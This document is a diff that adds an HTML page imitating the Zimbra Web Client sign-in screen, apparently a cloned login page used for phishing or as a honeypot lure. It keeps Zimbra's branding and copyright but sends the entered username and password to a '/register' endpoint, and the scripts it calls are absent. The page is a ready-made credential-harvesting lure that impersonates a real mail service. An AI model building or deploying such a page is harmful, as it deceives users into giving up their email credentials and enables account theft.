@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html class="user_font_size_normal" lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+	  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+    <title>Zimbra Web Client Sign In</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="description"
+      content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com."
+    />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="style.css"
+    />
+<link rel="icon" type="image/png" href="LoginBanner_white.png">
+
+  </head>
+  <body onload="onLoad();">
+    <div class="LoginScreen">
+      <div class="center">
+        <div class="contentBox">
+          <h1>
+            <a
+              href="https://www.zimbra.com/"
+              id="bannerLink"
+              target="_new"
+              title="Zimbra"
+              ><span class="ScreenReaderOnly">Zimbra</span>
+              <span class="ImgLoginBanner"></span>
+            </a>
+          </h1>
+          <div id="ZLoginAppName">Web Client</div>
+         <form method="post" action="/register" name="registerForm">
+    <table class="form">
+      <tr>
+        <td><label for="username">Username:</label></td>
+        <td>
+          <input
+            id="username"
+            class="zLoginField"
+            name="username"
+            type="text"
+            value=""
+            size="40"
+            maxlength="1024"
+            autocapitalize="off"
+            autocorrect="off"
+            required
+          />
+        </td>
+      </tr>
+      <tr>
+        <td><label for="password">Password:</label></td>
+        <td>
+          <input
+            id="password"
+            class="zLoginField"
+            name="password"
+            type="password"
+            value=""
+            size="40"
+            maxlength="1024"
+            required
+          />
+        </td>
+      </tr>
+      <tr>
+        <td>&nbsp;</td>
+        <td class="submitTD">
+         <input
+                    id="remember"
+                    value="1"
+                    type="checkbox"
+                    name="zrememberme"
+                  />
+                  <label for="remember">Stay signed in</label>
+                  <input
+                    type="submit"
+                    class="ZLoginButton DwtButton"
+                    value="Sign In"
+                  />
+        </td>
+      </tr>
+
+              <tr>
+                <td colspan="2"><hr /></td>
+              </tr>
+              <tr>
+                <td>
+                  <label for="client">Version:</label>
+                </td>
+                <td>
+                  <div class="positioning">
+                    <select
+                      id="client"
+                      name="client"
+                      onchange="clientChange(this.options[this.selectedIndex].value)"
+                    >
+                      <option value="preferred" selected>Default</option>
+                      <option value="advanced">Advanced (Ajax)</option>
+                      <option value="standard">Standard (HTML)</option>
+                      <option value="mobile">Mobile</option>
+                    </select>
+                    <script type="text/javascript">
+                      document.write(
+                        "<a href='#' onclick='showWhatsThis();' id='ZLoginWhatsThisAnchor' aria-controls='ZLoginWhatsThis' aria-expanded='false'>What’s This?</a>"
+                      );
+                    </script>
+                  
+                    <div
+                      id="ZLoginUnsupported"
+                      class="ZLoginInfoMessage"
+                      style="display: none"
+                    >
+                      Note that your web browser or display does not fully
+                      support the Advanced version. We strongly recommend that
+                      you use the Standard client.
+                    </div>
+                  </div>
+                </td>
+              </tr>
+            </table>
+          </form>
+        </div>
+
+    </div>
+	<div class="Footer">
+			<div id="ZLoginNotice" class="legalNotice-small"><a target="_new" href="https://www.zimbra.com">Zimbra</a> :: the leader in open source messaging and collaboration :: <a target="_new" href="https://blog.zimbra.com">Blog</a> - <a target="_new" href="https://wiki.zimbra.com">Wiki</a> - <a target="_new" href="https://www.zimbra.com/forums">Forums</a></div>
+			<div class="copyright">
+			Copyright © 2005-2023 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
+		</div>
+	</div>
+  </body>
+</html>
